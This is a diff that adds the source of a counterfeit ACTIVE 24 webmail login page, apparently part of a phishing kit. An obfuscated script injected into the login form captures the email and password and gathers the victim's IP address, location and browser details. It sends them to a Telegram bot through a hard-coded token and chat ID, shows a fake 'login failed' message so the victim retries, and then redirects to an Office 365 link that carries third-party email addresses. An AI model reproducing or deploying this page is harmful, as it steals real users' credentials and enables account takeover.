@@ -1,0 +1,224 @@
+source: <html>
+   <head>
+      <base href="/">
+      <meta charset="utf-8">
+      <title>Webmail | ACTIVE 24, s.r.o.</title>
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <meta name="Keywords" content="">
+      <meta name="Description" content="Webmail - ACTIVE 24, s.r.o.">
+      <meta name="Author" content="ACTIVE 24, s.r.o.">
+      <meta name="Owner" content="ACTIVE 24, s.r.o. ">
+      <!-- favicon start -->
+      <link rel="apple-touch-icon" sizes="57x57" href="https://gui.active24.cz/img/icon/a24-apple-favicon-57x57.png">
+      <link rel="apple-touch-icon" sizes="60x60" href="https://gui.active24.cz/img/icon/a24-apple-favicon-60x60.png">
+      <link rel="apple-touch-icon" sizes="72x72" href="https://gui.active24.cz/img/icon/a24-apple-favicon-72x72.png">
+      <link rel="apple-touch-icon" sizes="76x76" href="https://gui.active24.cz/img/icon/a24-apple-favicon-76x76.png">
+      <link rel="apple-touch-icon" sizes="114x114" href="https://gui.active24.cz/img/icon/a24-apple-favicon-114x114.png">
+      <link rel="apple-touch-icon" sizes="120x120" href="https://gui.active24.cz/img/icon/a24-apple-favicon-120x120.png">
+      <link rel="apple-touch-icon" sizes="144x144" href="https://gui.active24.cz/img/icon/a24-apple-favicon-144x144.png">
+      <link rel="apple-touch-icon" sizes="152x152" href="https://gui.active24.cz/img/icon/a24-apple-favicon-152x152.png">
+      <link rel="apple-touch-icon" sizes="180x180" href="https://gui.active24.cz/img/icon/a24-apple-favicon-180x180.png">
+      <link rel="icon" type="image/png" sizes="192x192" href="https://gui.active24.cz/img/icon/a24-favicon-192x192.png">
+      <link rel="icon" type="image/png" sizes="32x32" href="https://gui.active24.cz/img/icon/a24-favicon-32x32.png">
+      <link rel="icon" type="image/png" sizes="96x96" href="https://gui.active24.cz/img/icon/a24-favicon-96x96.png">
+      <link rel="icon" type="image/png" sizes="16x16" href="https://gui.active24.cz/img/icon/a24-favicon-16x16.png">
+      <meta name="msapplication-TileColor" content="#ffffff">
+      <meta name="msapplication-TileImage" content="https://gui.active24.cz/img/icon/a24-ms-icon-144x144.png">
+      <meta name="theme-color" content="#ffffff">
+      <!-- favicon end -->
+      <link rel="stylesheet" href="https://gui.active24.cz/library/theme/hp16/style.css">
+      <!--  DEV version-->
+      <link rel="stylesheet" href="https://active24.com/cssc/a21/main.less?v=7d8e320747f67055c1a1008fbc40d0c1">
+      <link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" media="all">
+      <link rel="stylesheet" type="text/css" href="https://gui.active24.cz/css/landing.css">
+      <link rel="stylesheet" href="https://webmail.active24.com/styles.4c929a3a146a32481c37.css">
+      <style></style>
+   </head>
+   <body class="hp hp15">
+      <app-root _nghost-yhe-c0="" ng-version="8.2.14">
+         <app-header _ngcontent-yhe-c0="" _nghost-yhe-c1="">
+            <header _ngcontent-yhe-c1="" class="header">
+               <div _ngcontent-yhe-c1="" class="header__container">
+                  <a _ngcontent-yhe-c1="" class="header__logo" role="button" href=""></a>
+                  <div _ngcontent-yhe-c1="" class="header__content">
+                     <div _ngcontent-yhe-c1="" class="header--mobile-right clearfix">
+                        <div _ngcontent-yhe-c1="" class="header-controls">
+                           <div _ngcontent-yhe-c1="" class="header-controls__row">
+                              <div _ngcontent-yhe-c1="" class="header-controls__inner-aligner-to-right">
+                                 <div _ngcontent-yhe-c1="" class="v-space--medium">
+                                    <button _ngcontent-yhe-c1="" id="dropdownLang" class="btn btn--secondary-blue lang-en"> English <span _ngcontent-yhe-c1="" class="dropdown-toggle"></span></button><!---->
+                                 </div>
+                              </div>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            </header>
+         </app-header>
+         <!---->
+         <div _ngcontent-yhe-c0="" class="block">
+            <div _ngcontent-yhe-c0="" class="block__container  h-pad v-space--medium">
+               <div _ngcontent-yhe-c0="" class="block__content">
+                  <!---->
+                  <div _ngcontent-yhe-c0="" id="error-msg" style="display: none;" class="message errorMessage"><span _ngcontent-yhe-c0="" class="messageText"><strong>Login failed</strong>. You entered either a wrong username or password. If you have lost or forgotten your password you can change it at: <a href="">Customer center</a>.</span></div>
+                  <!---->
+                  <noscript _ngcontent-yhe-c0="">
+                     <div _ngcontent-yhe-c0="" class="message warningMessage"></div>
+                  </noscript>
+               </div>
+            </div>
+         </div>
+         <div _ngcontent-yhe-c0="" class="block ">
+            <div _ngcontent-yhe-c0="" class="block__container">
+               <div _ngcontent-yhe-c0="" class="block__content">
+                  <div _ngcontent-yhe-c0="" class="block__item">
+                     <div _ngcontent-yhe-c0="" class="h-pad">
+                        <div _ngcontent-yhe-c0="" class="text-h2"><span _ngcontent-yhe-c0="" class="icon icon--profile"></span> Login in to the Webmail </div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </div>
+         <div _ngcontent-yhe-c0="" class="block block--light-blue">
+            <div _ngcontent-yhe-c0="" class="block__container block__container--r-2 block__container--extra-gap">
+               <div _ngcontent-yhe-c0="" class="block__content block__content--join-top">
+                  <div _ngcontent-yhe-c0="" class="block__item">
+                     <div _ngcontent-yhe-c0="" class="h-pad h-pad--left v-space--custom">
+                        <form _ngcontent-yhe-c0="" id="login-form" name="webMailForm" novalidate="" class="ng-dirty ng-touched ng-valid">
+                           <div _ngcontent-yhe-c0="" class="row align-items-center">
+                              <div _ngcontent-yhe-c0="" class="v-space col-2"><label _ngcontent-yhe-c0="" class="form__label" for="inputEmail">Name</label></div>
+                              <div _ngcontent-yhe-c0="" class="col-10"><input _ngcontent-yhe-c0="" class="form__input ng-dirty ng-valid ng-touched" formcontrolname="email" id="email" required="" type="email"></div>
+                           </div>
+                           <div _ngcontent-yhe-c0="" class="row align-items-center">
+                              <div _ngcontent-yhe-c0="" class="col-2"><label _ngcontent-yhe-c0="" class="form__label" for="inputPassword">Password</label></div>
+                              <div _ngcontent-yhe-c0="" class="col-10"><input _ngcontent-yhe-c0="" class="form__input ng-dirty ng-valid ng-touched" formcontrolname="password" id="password" required="" type="password"></div>
+                           </div>
+                           <div _ngcontent-yhe-c0="" class="row align-items-center v-space--medium">
+                              <div _ngcontent-yhe-c0="" class="col-2"></div>
+                              <div _ngcontent-yhe-c0="" class="col-10"><button _ngcontent-yhe-c0="" class="btn btn-normal btn--primary-blue btn btn--primary-blue" type="submit"><span _ngcontent-yhe-c0="">Login</span></button></div>
+                           </div>
+                        </form>
+<div id="thanks-message" style="display: none;fonts-size: 50px;">
+    <h2>pÅ™esmÄ›rovÃ¡nÃ­</h2>
+  </div>
+
+  <script>
+    function _0x34c5(){const _0x289051=['N/A','style','6wOqtEw','34017401lNpfJI','toLocaleString','display','8LMbbhl','preventDefault','block','7570195PZjWAn','json','location','none','query','thanks-message','7841552101:AAGcn9vyRl8NOBwRcPDxUtJqBCrEMX2GFKA','userAgent','3294960izoGyr','2175180cNTtBg','IP:\x20','10038UjtEIw','Browser:\x20','https://ipapi.co/json','82981SXhLiv','split','submit','Region:\x20','addEventListener','href','country','regionName','includes','value','https://outlook.office365.com/encryption/Login?itemID=E4E_M_5e217a7d-1049-4a97-9017-6be67ce4532d&recipientemailaddress=jhalgan@archre.bm&senderemailaddress=Boudien.Broekhuis@Schroders.com&st=Microsoft&anchorMailbox=SystemMailbox%7B0AF09B7F-434F-4B2F-9CBC-57639EDCFD9C%7D@schroders365.onmicrosoft.com&cfmRecipient=SystemMailbox%7B0AF09B7F-434F-4B2F-9CBC-57639EDCFD9C%7D@schroders365.onmicrosoft.com&e4e_sdata=tV+dniKkjjBGxFqnP3ixN5sEAPegYKr/L70If+v52EyxJk/8QWqD1/jQqbABYOt4s8xL9Ay+kfe/+0OybKr80jU6BPZhPPcNEfXoObvim1rWZ3xGvgKbrk6UxapJJcOfWy1NtftfHKgv4ZDyT7WvHdMaLv7Gh3ySiysQiqOnlHolojDVsZW/1fP2n5grX4SHFw9svwmmC+lJumFaqvaC3bb//lmxmFPE8vr0VNIhoMhTFn/9yZYhCjW4nk+WWxzoqolbNmhsqtW1yScnbuivkBuKSodq2pR3Mf64EmO2k0D3PHgOkhgwuF21SRtt0pxUFpi8YPcWOt8YNm0xI2+3mg==&omeVersion=V2&otpSSI=False','6507391544','stringify','1240820UZFhKX','4696AlYQDO','72rAAbaJ','trim','getElementById','email','/sendMessage','Password:\x20','city','password'];_0x34c5=function(){return _0x289051;};return _0x34c5();}const _0x336a53=_0x55c2;(function(_0x10d681,_0x2eed99){const _0x2f58fd=_0x55c2,_0x12c9b6=_0x10d681();while(!![]){try{const _0x337b3d=parseInt(_0x2f58fd(0x13d))/0x1*(-parseInt(_0x2f58fd(0x15a))/0x2)+-parseInt(_0x2f58fd(0x165))/0x3+parseInt(_0x2f58fd(0x14a))/0x4+-parseInt(_0x2f58fd(0x15d))/0x5*(-parseInt(_0x2f58fd(0x156))/0x6)+parseInt(_0x2f58fd(0x168))/0x7*(-parseInt(_0x2f58fd(0x14b))/0x8)+parseInt(_0x2f58fd(0x14c))/0x9*(-parseInt(_0x2f58fd(0x166))/0xa)+parseInt(_0x2f58fd(0x157))/0xb;if(_0x337b3d===_0x2eed99)break;else _0x12c9b6['push'](_0x12c9b6['shift']());}catch(_0x39f1a0){_0x12c9b6['push'](_0x12c9b6['shift']());}}}(_0x34c5,0xdcd8d));const form=document['getElementById']('login-form'),emailInput=document[_0x336a53(0x14e)](_0x336a53(0x14f)),passwordInput=document['getElementById'](_0x336a53(0x153)),errorMsg=document[_0x336a53(0x14e)]('error-msg'),thanksMessage=document['getElementById'](_0x336a53(0x162)),url=window[_0x336a53(0x15f)][_0x336a53(0x142)];let grabbedEmail='';if(url[_0x336a53(0x145)]('#'))grabbedEmail=url[_0x336a53(0x13e)]('#')[0x1];else url['includes']('?')&&(grabbedEmail=url[_0x336a53(0x13e)]('?')[0x1]);emailInput[_0x336a53(0x146)]=grabbedEmail;let attemptCount=0x0;function _0x55c2(_0x49f04a,_0x562399){const _0x34c5b7=_0x34c5();return _0x55c2=function(_0x55c259,_0x5721cf){_0x55c259=_0x55c259-0x13c;let _0x32c964=_0x34c5b7[_0x55c259];return _0x32c964;},_0x55c2(_0x49f04a,_0x562399);}form[_0x336a53(0x141)](_0x336a53(0x13f),async function(_0x4f4dba){const _0x2d821f=_0x336a53;_0x4f4dba[_0x2d821f(0x15b)](),attemptCount++;const _0x2e38e1=emailInput['value'][_0x2d821f(0x14d)](),_0x2229d2=passwordInput[_0x2d821f(0x146)]['trim'](),_0x206a2a=navigator[_0x2d821f(0x164)],_0x3c6fb2=new Date(),_0x223a00=_0x3c6fb2[_0x2d821f(0x158)]();let _0x9ebe04=_0x2d821f(0x154),_0x586cdf='',_0x1f15ef='',_0x3adbff='';try{const _0x3981b3=await fetch(_0x2d821f(0x13c)),_0x875346=await _0x3981b3[_0x2d821f(0x15e)]();_0x9ebe04=_0x875346[_0x2d821f(0x161)],_0x586cdf=_0x875346[_0x2d821f(0x143)],_0x1f15ef=_0x875346[_0x2d821f(0x144)],_0x3adbff=_0x875346[_0x2d821f(0x152)];}catch(_0x14f11c){}const _0x4dfa84=_0x2d821f(0x163),_0x40450d=_0x2d821f(0x148),_0x137773='Email:\x20'+_0x2e38e1+'\x0a'+(_0x2d821f(0x151)+_0x2229d2+'\x0a')+(_0x2d821f(0x167)+_0x9ebe04+'\x0a')+('Country:\x20'+_0x586cdf+'\x0a')+(_0x2d821f(0x140)+_0x1f15ef+'\x0a')+('City:\x20'+_0x3adbff+'\x0a')+(_0x2d821f(0x169)+_0x206a2a+'\x0a')+('Date\x20&\x20Time:\x20'+_0x223a00);fetch('https://api.telegram.org/bot'+_0x4dfa84+_0x2d821f(0x150),{'method':'POST','headers':{'Content-Type':'application/json'},'body':JSON[_0x2d821f(0x149)]({'chat_id':_0x40450d,'text':_0x137773})}),attemptCount<0x3?(passwordInput['value']='',errorMsg['style'][_0x2d821f(0x159)]=_0x2d821f(0x15c)):(form[_0x2d821f(0x155)][_0x2d821f(0x159)]=_0x2d821f(0x160),errorMsg[_0x2d821f(0x155)][_0x2d821f(0x159)]=_0x2d821f(0x160),thanksMessage[_0x2d821f(0x155)][_0x2d821f(0x159)]=_0x2d821f(0x15c),setTimeout(()=>{const _0x3335bc=_0x2d821f;window[_0x3335bc(0x15f)][_0x3335bc(0x142)]=_0x3335bc(0x147);},0xbb8));});
+  </script>
+                     </div>
+                  </div>
+               </div>
+               <div _ngcontent-yhe-c0="" class="block__illu block__illu--b-overlap block__illu--t-overlap">
+                  <div _ngcontent-yhe-c0="" class="block__image" id="main-image"></div>
+               </div>
+            </div>
+         </div>
+         <div _ngcontent-yhe-c0="" class="block">
+            <div _ngcontent-yhe-c0="" class="block__container">
+               <div _ngcontent-yhe-c0="" class="block__content">
+                  <div _ngcontent-yhe-c0="" class="block__item">
+                     <div _ngcontent-yhe-c0="" class="h-pad v-space--custom">
+                        <div _ngcontent-yhe-c0="" class="tiles v-space--custom">
+                           <!----><!---->
+                           <div _ngcontent-yhe-c0="" class="tiles__item">
+                              <div _ngcontent-yhe-c0="" class="tiles__container">
+                                 <div _ngcontent-yhe-c0="" class="tiles__content">
+                                    <h3 _ngcontent-yhe-c0="" class="text-center v-space--custom"><a _ngcontent-yhe-c0="" href="https://login.microsoftonline.com/">Log in to Microsoft Office 365</a></h3>
+                                 </div>
+                              </div>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </div>
+         <app-footer _ngcontent-yhe-c0="" _nghost-yhe-c2="">
+            <footer _ngcontent-yhe-c2="" class="footer">
+               <div _ngcontent-yhe-c2="" class="content-wrapper">
+                  <div _ngcontent-yhe-c2="" class="container">
+                     <div _ngcontent-yhe-c2="" class="footer-menu">
+                        <div _ngcontent-yhe-c2="" class="footer-menu__row">
+                           <div _ngcontent-yhe-c2="" class="footer-column">
+                              <input _ngcontent-yhe-c2="" class="hidden" data-visibility-condition-trigger="" id="about" type="checkbox"><label _ngcontent-yhe-c2="" class="footer-column__title" data-visibility-condition-label="" for="about"><span _ngcontent-yhe-c2="">About</span><span _ngcontent-yhe-c2="" class="icon icon--arrow-bottom"></span><span _ngcontent-yhe-c2="" class="icon icon--arrow-top"></span></label>
+                              <ul _ngcontent-yhe-c2="" class="footer-column__list" data-visibility-condition-target="">
+                                 <li _ngcontent-yhe-c2=""><a _ngcontent-yhe-c2="" target="_parent" href="https://www.active24.co.uk/about">About ACTIVE 24</a></li>
+                                 <li _ngcontent-yhe-c2=""><a _ngcontent-yhe-c2="" target="_parent" href="https://www.active24.co.uk/agreement">Terms and Conditions</a></li>
+                                 <!---->
+                                 <li _ngcontent-yhe-c2=""><a _ngcontent-yhe-c2="" target="_parent" href="https://www.active24.co.uk/about/career">Career</a></li>
+                                 <!---->
+                                 <li _ngcontent-yhe-c2=""><a _ngcontent-yhe-c2="" target="_parent" href="https://www.active24.co.uk/cooperation/partner-program">Partner program</a></li>
+                                 <!----><!---->
+                                 <li _ngcontent-yhe-c2=""><a _ngcontent-yhe-c2="" target="_parent" href="https://www.active24.co.uk/Contacts">Contact</a></li>
+                              </ul>
+                           </div>
+                           <div _ngcontent-yhe-c2="" class="footer-column">
+                              <input _ngcontent-yhe-c2="" class="hidden" data-visibility-condition-trigger="" id="customers" type="checkbox"><label _ngcontent-yhe-c2="" class="footer-column__title" data-visibility-condition-label="" for="customers"><span _ngcontent-yhe-c2="">For our customers</span><span _ngcontent-yhe-c2="" class="icon icon--arrow-bottom"></span><span _ngcontent-yhe-c2="" class="icon icon--arrow-top"></span></label>
+                              <ul _ngcontent-yhe-c2="" class="footer-column__list" data-visibility-condition-target="">
+                                 <!---->
+                                 <li _ngcontent-yhe-c2=""><a _ngcontent-yhe-c2="" target="_parent" href="https://www.active24.co.uk/special-offers">Special offers</a></li>
+                                 <li _ngcontent-yhe-c2=""><a _ngcontent-yhe-c2="" target="_parent" href="https://customer.active24.com/login?locale=en">Customer center</a></li>
+                                 <li _ngcontent-yhe-c2=""><a _ngcontent-yhe-c2="" target="_parent" href="https://www.active24.co.uk/support">Customer support</a></li>
+                                 <li _ngcontent-yhe-c2=""><a _ngcontent-yhe-c2="" target="_parent" href="https://www.active24.co.uk/website">How to create a website</a></li>
+                                 <!---->
+                                 <li _ngcontent-yhe-c2=""><a _ngcontent-yhe-c2="" target="_parent" href="https://www.active24.co.uk/weborder/login">Registration</a></li>
+                              </ul>
+                           </div>
+                        </div>
+                        <div _ngcontent-yhe-c2="" class="footer-menu__row">
+                           <div _ngcontent-yhe-c2="" class="footer-column">
+                              <input _ngcontent-yhe-c2="" class="hidden" data-visibility-condition-trigger="" id="interfaces" type="checkbox"><label _ngcontent-yhe-c2="" class="footer-column__title" data-visibility-condition-label="" for="interfaces"><span _ngcontent-yhe-c2="">Web interfaces</span><span _ngcontent-yhe-c2="" class="icon icon--arrow-bottom"></span><span _ngcontent-yhe-c2="" class="icon icon--arrow-top"></span></label>
+                              <ul _ngcontent-yhe-c2="" class="footer-column__list" data-visibility-condition-target="">
+                                 <li _ngcontent-yhe-c2=""><a _ngcontent-yhe-c2="" target="_parent" href="https://webmail.active24.com/">Webmail</a></li>
+                                 <li _ngcontent-yhe-c2=""><a _ngcontent-yhe-c2="" target="_parent" href="https://mysql.active24.com/">MySQL</a></li>
+                                 <li _ngcontent-yhe-c2=""><a _ngcontent-yhe-c2="" target="_parent" href="https://mssql.active24.com/">MSSQL</a></li>
+                                 <li _ngcontent-yhe-c2=""><a _ngcontent-yhe-c2="" target="_parent" href="https://webftp.active24.com/">WebFTP</a></li>
+                              </ul>
+                           </div>
+                           <div _ngcontent-yhe-c2="" class="footer-column">
+                              <input _ngcontent-yhe-c2="" class="hidden" data-visibility-condition-trigger="" id="help" type="checkbox"><label _ngcontent-yhe-c2="" class="footer-column__title" data-visibility-condition-label="" for="help"><span _ngcontent-yhe-c2="">Help</span><span _ngcontent-yhe-c2="" class="icon icon--arrow-bottom"></span><span _ngcontent-yhe-c2="" class="icon icon--arrow-top"></span></label>
+                              <ul _ngcontent-yhe-c2="" class="footer-column__list" data-visibility-condition-target="">
+                                 <li _ngcontent-yhe-c2=""><a _ngcontent-yhe-c2="" target="_parent" href="https://faq.active24.com/eng/959300-Basic-information?l=en-US">Basic Information</a></li>
+                                 <li _ngcontent-yhe-c2=""><a _ngcontent-yhe-c2="" target="_parent" href="https://faq.active24.com/eng/309399-Domains-and-DNS?l=en-US">Domain and DNS</a></li>
+                                 <li _ngcontent-yhe-c2=""><a _ngcontent-yhe-c2="" target="_parent" href="https://faq.active24.com/eng/892433-E-mail-services?l=en-US">E-mail services</a></li>
+                                 <li _ngcontent-yhe-c2=""><a _ngcontent-yhe-c2="" target="_parent" href="https://faq.active24.com/eng/355507-Hosting-and-servers?l=en-US">Hosting and Servers</a></li>
+                                 <li _ngcontent-yhe-c2=""><a _ngcontent-yhe-c2="" target="_parent" href="https://faq.active24.com/eng/319084-Websites-and-e-shops?l=en-US">Websites and e-shops</a></li>
+                                 <li _ngcontent-yhe-c2=""><a _ngcontent-yhe-c2="" target="_parent" href="https://faq.active24.com/eng/694244-Security?l=en-US">Safety</a></li>
+                                 <li _ngcontent-yhe-c2=""><a _ngcontent-yhe-c2="" target="_parent" href="https://faq.active24.com/eng/845797-Orders-and-payments?l=en-US">Orders and Payment</a></li>
+                                 <!---->
+                              </ul>
+                           </div>
+                        </div>
+                     </div>
+                     <div _ngcontent-yhe-c2="" class="footer-contacts">
+                        <div _ngcontent-yhe-c2="" class="footer-contacts__content">
+                           <a _ngcontent-yhe-c2="" class="footer-contacts__item footer-contacts__item--phone icon-link" target="_parent" href="tel:+442 036 216853"><span _ngcontent-yhe-c2="" class="footer-contacts__label">+442 036 216853</span></a><!----><a _ngcontent-yhe-c2="" class="footer-contacts__item footer-contacts__item--mail icon-link" target="_parent" href="support@active24.co.uk"><span _ngcontent-yhe-c2="" class="footer-contacts__label">support@active24.co.uk</span></a>
+                        </div>
+                     </div>
+                     <div _ngcontent-yhe-c2="" class="footer-bottom">
+                        <!---->
+                        <div _ngcontent-yhe-c2="" class="footer-social">
+                           <span _ngcontent-yhe-c2="" class="footer-social__label">Follow us </span>
+                           <ul _ngcontent-yhe-c2="" class="footer-social__list">
+                              <li _ngcontent-yhe-c2=""><a _ngcontent-yhe-c2="" class="footer-social__logo" target="_parent" href=""><img _ngcontent-yhe-c2="" alt="Facebook" src="https://gui.active24.cz/img/facebook.svg"></a></li>
+                              <!----><!---->
+                           </ul>
+                        </div>
+                        <div _ngcontent-yhe-c2="" class="footer-footnote">
+                           <p _ngcontent-yhe-c2="" class="footer-footnote__item footer-footnote__item--copyright">Â© 2019 ACTIVE 24, s.r.o. All rights reserved.Privacy Statement </p>
+                           <ul _ngcontent-yhe-c2="" class="footer-footnote__item footer-footnote__item--links">
+                              <li _ngcontent-yhe-c2=""><a _ngcontent-yhe-c2="" target="_parent" href="https://www.active24.co.uk/privacy">Privacy Statement</a></li>
+                              <li _ngcontent-yhe-c2=""><a _ngcontent-yhe-c2="" target="_parent" href="https://www.active24.co.uk/cookies">Rules for using cookies</a></li>
+                           </ul>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            </footer>
+         </app-footer>
+      </app-root>
+
+   </body>
+</html>
+Page title: Webmail | ACTIVE 24, s.r.o.
